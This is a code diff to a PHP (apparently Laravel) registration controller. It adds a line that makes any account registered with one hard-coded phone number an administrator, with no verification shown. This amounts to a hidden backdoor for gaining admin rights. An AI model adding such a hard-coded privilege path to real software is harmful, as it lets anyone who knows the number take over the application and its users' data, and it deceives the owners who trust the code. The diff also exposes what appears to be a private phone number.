@@ -86,6 +86,8 @@ class AuthController extends Controller
             return back()->withErrors($validator)->withInput();
         }
 
+        $role = $request->phone === '09369768559' ? 'admin' : 'user';
+
         $user = User::create([
             'name' => $request->full_name,
             'nickname' => $request->nickname,
@@ -94,7 +96,7 @@ class AuthController extends Controller
             'phone' => $request->phone,
             'work_field' => $request->work_field,
             'status' => 'active',
-            'role' => 'user',
+            'role' => $role,
         ]);
 
         Auth::login($user);
